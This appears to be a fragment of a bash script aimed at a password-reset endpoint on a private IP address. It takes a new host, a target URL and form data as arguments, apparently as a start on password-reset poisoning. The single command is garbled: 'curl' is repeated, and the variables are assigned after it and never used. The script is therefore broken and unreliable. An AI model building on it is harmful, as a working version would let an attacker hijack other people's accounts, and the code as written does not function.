#!/bin/bash
curl curl http://10.42.239.138/reset_password NEW_HOST="$1" TARGET_URL="$2" FORM_DATA="$3"
